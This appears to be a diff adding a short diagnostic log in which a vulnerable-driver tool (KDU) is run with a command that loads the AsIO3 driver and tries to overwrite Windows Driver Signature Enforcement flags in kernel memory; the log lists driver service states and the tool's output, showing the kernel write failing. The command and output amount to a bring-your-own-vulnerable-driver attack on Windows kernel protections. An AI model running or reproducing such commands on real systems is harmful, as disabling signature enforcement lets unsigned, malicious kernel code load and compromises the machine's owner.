@@ -1,0 +1,37 @@
+=== h1b PROVIDER PROBE 02/11/2026 23:33:55 pid=15736 ===
+DBUtilDrv2 ::  SERVICE_NAME: DBUtilDrv2 TYPE : 1 KERNEL_DRIVER STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0
+gdrv3 ::  SERVICE_NAME: gdrv3 TYPE : 1 KERNEL_DRIVER STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0
+apexdrv ::  SERVICE_NAME: apexdrv TYPE : 1 KERNEL_DRIVER STATE : 1 STOPPED WIN32_EXIT_CODE : 577 (0x241) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0
+## diag (safe, no kernel writes)
+  rc=1
+## kdu -prv 22 -dse 6 (write 6 over 6, provider trace)
+  rc=0
+DBUtilDrv2 ::  SERVICE_NAME: DBUtilDrv2 TYPE : 1 KERNEL_DRIVER STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0
+apexdrv ::  SERVICE_NAME: apexdrv TYPE : 1 KERNEL_DRIVER STATE : 1 STOPPED WIN32_EXIT_CODE : 577 (0x241) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0
+## tail of dse6 capture
+
+[+] Vulnerable driver "AsIO3" loaded
+
+[+] Executing pre-open callback for given provider
+
+[+] Driver device "Asusgio3" has been opened successfully
+
+[+] Executing post-open callback for given provider
+
+[+] Driver device security descriptor set successfully
+
+[!] Cannot load symsrv.dll, make sure it is in program directory, GetLastError 126: The specified module could not be found.
+
+[+] Module "CI.dll" loaded for pattern search
+
+[+] DSE flags (0xFFFFF80223BC2004) value: 4016, new value to be written: 6
+
+[!] Error while writing to the kernel memory, GetLastError 3221225477
+
+[+] Vulnerable driver "AsIO3" unloaded
+
+[+] Vulnerable driver file removed
+
+[+] Return value: 0. Bye-bye!
+
+=== END h1b ===
